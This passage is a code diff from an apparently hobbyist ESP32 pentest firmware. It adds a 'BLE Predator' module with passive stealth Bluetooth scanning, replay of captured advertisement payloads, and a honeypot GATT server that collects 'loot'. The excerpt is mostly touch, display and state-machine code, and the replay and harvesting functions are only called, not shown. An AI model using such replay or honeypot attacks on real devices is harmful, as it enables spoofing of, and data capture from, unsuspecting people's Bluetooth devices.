+        int filtered = bpCountFiltered();
+        if (tx < SCREEN_WIDTH / 2) {
+            // Prev page
+            if (S->listStartIndex >= BP_MAX_VISIBLE) {
+                S->listStartIndex -= BP_MAX_VISIBLE;
+                S->currentIndex = S->listStartIndex;
+                drawDeviceList();
+            }
+        } else {
+            // Next page
+            if (S->listStartIndex + BP_MAX_VISIBLE < filtered) {
+                S->listStartIndex += BP_MAX_VISIBLE;
+                S->currentIndex = S->listStartIndex;
+                drawDeviceList();
+            }
+        }
+    }
+}
+
+static void goBackToListen() {
+    S->phase = PHASE_LISTEN;
+    S->listenDirty = true;
+    tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, TFT_BLACK);
+    drawIconBar();
+    drawDeviceList();
+}
+
+static void handleTargetTouch() {
+    uint16_t tx, ty;
+    bool touching = getTouchPoint(&tx, &ty);
+
+    if (bpWaitForRelease) {
+        if (!touching) bpWaitForRelease = false;
+        return;
+    }
+    if (!touching) return;
+    if (millis() - S->lastIconTap < 350) return;
+    S->lastIconTap = millis();
+    bpWaitForRelease = true;
+
+    // Icon bar back → return to LISTEN (NOT exit module)
+    if (ty >= ICON_BAR_Y && ty <= ICON_BAR_BOTTOM + 4) {
+        goBackToListen();
+        return;
+    }
+
+    // REPLAY / HONEYPOT / BACK buttons — use saved Y position
+    int btnY = S->targetBtnY;
+    int btnH = SCALE_H(24);
+    int btnW = SCALE_W(60);
+    int replayX  = SCALE_X(5);
+    int hpotX    = SCALE_X(80);
+    int backX    = SCALE_X(160);
+
+    if (ty >= btnY && ty <= btnY + btnH) {
+        // REPLAY button (same as old ATTACK)
+        if (tx >= replayX && tx <= replayX + btnW) {
+            if (!::isOffensiveAllowed()) return;
+
+            int realIdx = bpFilteredToReal(S->detailIdx);
+            if (realIdx < 0) return;
+            ReconDevice* d = &S->devices[realIdx];
+            if (d->payloadLen == 0) return;
+
+            if (!d->selected) {
+                d->selected = true;
+            }
+
+            startReplay();
+            return;
+        }
+
+        // HONEYPOT button → start RECON phase
+        if (tx >= hpotX && tx <= hpotX + btnW + SCALE_W(10)) {
+            if (!::isOffensiveAllowed()) return;
+
+            int realIdx = bpFilteredToReal(S->detailIdx);
+            if (realIdx < 0) return;
+            ReconDevice* d = &S->devices[realIdx];
+            if (d->payloadLen == 0) return;
+
+            if (!d->selected) {
+                d->selected = true;
+            }
+
+            startRecon();
+            return;
+        }
+
+        // BACK button
+        if (tx >= backX && tx <= backX + btnW) {
+            goBackToListen();
+            return;
+        }
+    }
+}
+
+static void handleAttackTouch() {
+    uint16_t tx, ty;
+    bool touching = getTouchPoint(&tx, &ty);
+
+    if (bpWaitForRelease) {
+        if (!touching) bpWaitForRelease = false;
+        return;
+    }
+    if (!touching) return;
+    if (millis() - S->lastIconTap < 350) return;
+    S->lastIconTap = millis();
+    bpWaitForRelease = true;
+
+    // Icon bar
+    if (ty >= ICON_BAR_Y && ty <= ICON_BAR_BOTTOM + 4) {
+        // Back
+        if (tx >= SCALE_X(5) && tx < SCALE_X(35)) {
+            stopReplay();
+            return;
+        }
+        // Stop
+        if (tx >= SCALE_X(45) && tx < SCALE_X(75)) {
+            stopReplay();
+            return;
+        }
+        // Speed cycle
+        if (tx >= SCALE_X(90) && tx < SCALE_X(120)) {
+            S->dwellIndex = (S->dwellIndex + 1) % BP_DWELL_COUNT;
+            S->replayDwellMs = dwellPresets[S->dwellIndex];
+            // Redraw dwell indicator
+            tft.setTextSize(1);
+            tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
+            tft.setCursor(5, SCALE_Y(108));
+            tft.printf("DWELL: %dms    ", S->replayDwellMs);
+            return;
+        }
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// PUBLIC FUNCTIONS
+// ═══════════════════════════════════════════════════════════════════════════
+
+void setup() {
+    if (S && S->initialized) return;
+
+    #if CYD_DEBUG
+    Serial.println("[PREDATOR] Initializing BLE Predator...");
+    #endif
+
+    // Heap-allocate state (zero-init)
+    if (!S) {
+        S = (PredatorState*)calloc(1, sizeof(PredatorState));
+        if (!S) {
+            Serial.println("[PREDATOR] ERROR: calloc failed");
+            return;
+        }
+    } else {
+        memset(S, 0, sizeof(PredatorState));
+    }
+
+    S->replayDwellMs = 100;
+    S->dwellIndex = 0;
+    S->filter = PF_ALL;
+    S->phase = PHASE_LISTEN;
+
+    tft.fillScreen(HALEHOUND_BLACK);
+    drawStatusBar();
+    drawIconBar();
+
+    // Tear down WiFi before BLE init
+    WiFi.mode(WIFI_OFF);
+    delay(50);
+
+    // BLE init
+    releaseClassicBtMemory();
+    BLEDevice::init("");
+    delay(150);
+
+    S->pScan = BLEDevice::getScan();
+    if (!S->pScan) {
+        Serial.println("[PREDATOR] ERROR: getScan() returned NULL");
+        S->exitRequested = true;
+        return;
+    }
+
+    S->pScan->setActiveScan(false);   // PASSIVE — stealth mode
+    S->pScan->setInterval(100);
+    S->pScan->setWindow(99);          // Near-continuous listening
+    S->pScan->setAdvertisedDeviceCallbacks(&predatorCB, true);  // wantDuplicates = true
+
+    S->scanning = true;
+    S->initialized = true;
+    S->scanStartTime = millis();
+    S->lastDisplayUpdate = millis();
+
+    drawDeviceList();
+
+    // Start continuous non-blocking scan
+    S->pScan->start(5, bpScanComplete, false);
+
+    // Consume lingering touch from menu
+    waitForTouchRelease();
+
+    #if CYD_DEBUG
+    Serial.printf("[PREDATOR] Ready, passive scan started. Heap: %u\n", ESP.getFreeHeap());
+    #endif
+}
+
+void loop() {
+    if (!S || !S->initialized) return;
+
+    // Process pending device from BLE callback
+    if (S->pendingReady) {
+        bpAddOrUpdate(S->pendingMAC, S->pendingAddrType, S->pendingRSSI,
+                      S->pendingName, S->pendingHasName,
+                      S->pendingMfgData, S->pendingMfgLen,
+                      S->pendingPayload, S->pendingPayloadLen);
+        S->pendingReady = false;
+        S->totalFrames++;
+        S->listenDirty = true;  // New data — schedule redraw
+    }
+
+    unsigned long now = millis();
+
+    switch (S->phase) {
+        case PHASE_LISTEN:
+            // Touch handling
+            handleListenTouch();
+
+            // BOOT button exit
+            if (IS_BOOT_PRESSED()) {
+                S->exitRequested = true;
+                return;
+            }
+
+            // Only redraw when dirty AND throttled (1 second min between redraws)
+            if (S->listenDirty && now - S->lastDisplayUpdate > 1000) {
+                drawDeviceList();
+                S->lastDisplayUpdate = now;
+                S->listenDirty = false;
+            }
+            break;
+
+        case PHASE_TARGET:
+            handleTargetTouch();
+
+            if (IS_BOOT_PRESSED()) {
+                goBackToListen();
+            }
+            break;
+
+        case PHASE_ATTACK:
+            handleAttackTouch();
+
+            if (IS_BOOT_PRESSED()) {
+                stopReplay();
+                return;
+            }
+
+            // Dynamic attack display at ~10fps
+            if (now - S->lastDisplayUpdate >= 100) {
+                drawDynamicAttack();
+                drawSkulls();
+                drawCounterBar();
+                S->lastDisplayUpdate = now;
+            }
+            break;
+
+        case PHASE_RECON:
+            // RECON is synchronous (runs in startRecon), but handle touch for abort
+            handleReconTouch();
+
+            if (IS_BOOT_PRESSED()) {
+                goBackToListen();
+            }
+            break;
+
+        case PHASE_HONEYPOT:
+            handleHoneypotTouch();
+
+            if (IS_BOOT_PRESSED()) {
+                stopHoneypot();
+                return;
+            }
+
+            // Dynamic honeypot display at ~4fps (250ms)
+            if (now - S->lastDisplayUpdate >= 250) {
+                if (!S->staticDrawn) {
+                    drawHoneypotStatic();
+                }
+                drawHoneypotLoot();
+                S->lastDisplayUpdate = now;
+            }
+            break;
+    }
+
+    yield();
+}
+
+bool isExitRequested() {
+    return S ? S->exitRequested : false;
+}
+
+void cleanup() {
+    if (S) {
+        stopReplayTask();
+
+        // Tear down honeypot GATTS if active
+        if (S->hpActive) {
+            S->hpActive = false;
+            if (S->hpAdvStarted) {
+                esp_ble_gap_stop_advertising();
+                S->hpAdvStarted = false;
+            }
+            esp_ble_gatts_app_unregister(S->hpGattsIf);
+        }
+
+        if (S->pScan) {
+            if (S->scanning) S->pScan->stop();
+            S->pScan->setAdvertisedDeviceCallbacks(nullptr, false);
+            S->pScan = nullptr;
+        }
+
+        S->scanning = false;
+        BLEDevice::deinit(false);
+
+        free(S);
+        S = nullptr;
+    }
+
+    // Restore WiFi for other modules
+    WiFi.mode(WIFI_STA);
+
+    #if CYD_DEBUG
+    Serial.println("[PREDATOR] Cleanup complete");
+    #endif
+}
+
+}  // namespace BlePredator
